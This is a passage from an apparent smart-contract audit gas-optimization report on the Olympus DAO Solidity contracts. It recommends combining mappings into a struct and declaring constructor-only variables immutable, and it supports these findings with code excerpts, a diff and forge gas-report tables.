\u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 1638243                                                \u2506 8250            \u2506        \u2506        \u2506        \u2506         \u2502 +\u2502 1642043                                                \u2506 8269            \u2506        \u2506        \u2506        \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 Function Name                                          \u2506 min             \u2506 avg    \u2506 median \u2506 max    \u2506 # calls \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -297,7 +297,7 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 configureDependencies                                  \u2506 47868           \u2506 48513  \u2506 47868  \u2506 51868  \u2506 31      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 endorseProposal                                        \u2506 6874            \u2506 39015  \u2506 30774  \u2506 52674  \u2506 43      \u2502 +\u2502 endorseProposal                                        \u2506 6476            \u2506 38636  \u2506 30376  \u2506 52276  \u2506 43      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 executeProposal                                        \u2506 1850            \u2506 171376 \u2506 238748 \u2506 238748 \u2506 7       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 ```  ### [G&#x2011;02]  Multiple `address`/ID mappings can be combined into a single `mapping` of an `address`/ID to a `struct`, where appropriate Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (**20000 gas**) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save **~42 gas per access** due to [not having to recalculate the key's keccak256 hash](https://gist.github.com/IllIllI000/ec23a57daa30a8f8ca8b9681c8ccefb0) (Gkeccak256 - 30 gas) and that calculation's associated stack operations.  *There is 1 instance of this issue:* ```solidity File: src/policies/Governance.sol  96        mapping(uint256 => ProposalMetadata) public getProposalMetadata; 97     98        /// @notice Return the total endorsements for a proposal id. 99        mapping(uint256 => uint256) public totalEndorsementsForProposal; 100    101       /// @notice Return the number of endorsements a user has given a proposal id. 102       mapping(uint256 => mapping(address => uint256)) public userEndorsementsForProposal; 103    104       /// @notice Return whether a proposal id has been activated. Once this is true, it should never be flipped false. 105       mapping(uint256 => bool) public proposalHasBeenActivated; 106    107       /// @notice Return the total yes votes for a proposal id used in calculating net votes. 108       mapping(uint256 => uint256) public yesVotesForProposal; 109    110       /// @notice Return the total no votes for a proposal id used in calculating net votes. 111       mapping(uint256 => uint256) public noVotesForProposal; 112    113       /// @notice Return the amount of votes a user has applied to a proposal id. This does not record how the user voted. 114       mapping(uint256 => mapping(address => uint256)) public userVotesForProposal; 115    116       /// @notice Return the amount of tokens reclaimed by a user after voting on a proposal id. 117:      mapping(uint256 => mapping(address => bool)) public tokenClaimsForProposal;  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Governance.sol#L96-L117  ### [G&#x2011;03]  State variables only set in the constructor should be declared `immutable` Avoids a Gsset (**20000 gas**) in the constructor, and replaces the first access in each transaction (Gcoldsload - **2100 gas**) and each access thereafter (Gwarmacces - **100 gas**) with a `PUSH32` (**3 gas**).  *There are 11 instances of this issue:* ```solidity File: src/policies/BondCallback.sol  /// @audit aggregator (constructor) 43:           aggregator = aggregator_;  /// @audit aggregator (access) 91:           (, , ERC20 payoutToken, , , ) = aggregator.getAuctioneer(id_).getMarketInfoForPurchase(id_);  /// @audit aggregator (access) 109:          (, , ERC20 payoutToken, ERC20 quoteToken, , ) = aggregator  /// @audit ohm (constructor) 44:           ohm = ohm_;  /// @audit ohm (access) 57:           ohm.safeApprove(address(MINTR), type(uint256).max);  /// @audit ohm (access) 94:           if (address(payoutToken) != address(ohm)) {  /// @audit ohm (access) 118:          if (quoteToken == payoutToken && quoteToken == ohm) {  /// @audit ohm (access) 125:          } else if (quoteToken == ohm) {  /// @audit ohm (access) 131:          } else if (payoutToken == ohm) {  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/BondCallback.sol#L43  ```solidity File: src/policies/Heart.sol  /// @audit _operator (constructor) 60:           _operator = operator_;  /// @audit _operator (access) 100:          _operator.operate();  ``` https://github.com/code-423n4/2022-08-olympus/blob/b5e139d732eb4c07102f149fb9426d356af617aa/src/policies/Heart.sol#L60  ```diff diff --git a/src/policies/BondCallback.sol b/src/policies/BondCallback.sol index 4da1a3a..4383f7e 100644 --- a/src/policies/BondCallback.sol +++ b/src/policies/BondCallback.sol @@ -25,11 +25,11 @@ contract BondCallback is Policy, ReentrancyGuard, IBondCallback {      mapping(uint256 => uint256[2]) internal _amountsPerMarket;      mapping(ERC20 => uint256) public priorBalances;   -    IBondAggregator public aggregator; +    IBondAggregator immutable public aggregator;      OlympusTreasury public TRSRY;      OlympusMinter public MINTR;      Operator public operator; -    ERC20 public ohm; +    ERC20 immutable public ohm;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE diff --git a/src/policies/Heart.sol b/src/policies/Heart.sol index 7693dba..b0a46f2 100644 --- a/src/policies/Heart.sol +++ b/src/policies/Heart.sol @@ -45,7 +45,7 @@ contract OlympusHeart is IHeart, Policy, ReentrancyGuard {      OlympusPrice internal PRICE;        // Policies -    IOperator internal _operator; +    IOperator immutable internal _operator;        /*//////////////////////////////////////////////////////////////                              POLICY INTERFACE ```  Note that the numbers below are an underreporting of the gas changes due to [this](https://gist.github.com/0xA5DF/cc71e507d45fd51d708b3e8318654ce5) `forge` issue ```diff diff --git a/tmp/gas_before b/tmp/gas_after index c793374..1cea2f8 100644 --- a/tmp/gas_before +++ b/tmp/gas_after @@ -24,7 +24,7 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 allKeycodes                    \u2506 706             \u2506 706    \u2506 706    \u2506 706    \u2506 2       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 executeAction                  \u2506 649             \u2506 156798 \u2506 94565  \u2506 595110 \u2506 767     \u2502 +\u2502 executeAction                  \u2506 649             \u2506 156789 \u2506 94565  \u2506 595110 \u2506 767     \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 executor                       \u2506 2393            \u2506 2393   \u2506 2393   \u2506 2393   \u2506 1       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -258,7 +258,7 @@  \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561  \u2502 Deployment Cost                                     \u2506 Deployment Size \u2506       \u2506        \u2506        \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 1408325                                             \u2506 6934            \u2506       \u2506        \u2506        \u2506         \u2502 +\u2502 1417471                                             \u2506 7248            \u2506       \u2506        \u2506        \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 Function Name                                       \u2506 min             \u2506 avg   \u2506 median \u2506 max    \u2506 # calls \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -268,9 +268,9 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 batchToTreasury                                     \u2506 4111            \u2506 12729 \u2506 12068  \u2506 22668  \u2506 4       \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 callback                                            \u2506 7678            \u2506 98980 \u2506 85627  \u2506 187927 \u2506 17      \u2502 +\u2502 callback                                            \u2506 7678            \u2506 97563 \u2506 85333  \u2506 183633 \u2506 17      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 configureDependencies                               \u2506 73564           \u2506 73564 \u2506 73564  \u2506 73564  \u2506 63      \u2502 +\u2502 configureDependencies                               \u2506 73464           \u2506 73464 \u2506 73464  \u2506 73464  \u2506 63      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 isActive                                            \u2506 395             \u2506 395   \u2506 395    \u2506 395    \u2506 63      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 @@ -282,7 +282,7 @@  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524  \u2502 setOperator                                         \u2506 8227            \u2506 23461 \u2506 23865  \u2506 23865  \u2506 65      \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 whitelist                                           \u2506 8221            \u2506 39608 \u2506 34675  \u2506 67005  \u2506 46      \u2502 +\u2502 whitelist                                           \u2506 8221            \u2506 38018 \u2506 32143  \u2506 62802  \u2506 46      \u2502  \u2570\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256f  \u256d\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u256e  \u2502 src/policies/Governance.sol:OlympusGovernance contract \u2506                 \u2506        \u2506        \u2506        \u2506         \u2502 @@ -336,13 +336,13 @@  \u255e\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u256a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2561  \u2502 Deployment Cost                              \u2506 Deployment Size \u2506       \u2506        \u2506       \u2506         \u2502  \u251c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u253c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u254c\u2524 -\u2502 934119                                       \u2506 4277            \u2506       \u2506        \u2506       \u2506         \u2502 +\u2502 914213                                       \u2506 4290            \u2506       \u2506        \u2506       \u2506         \u2502  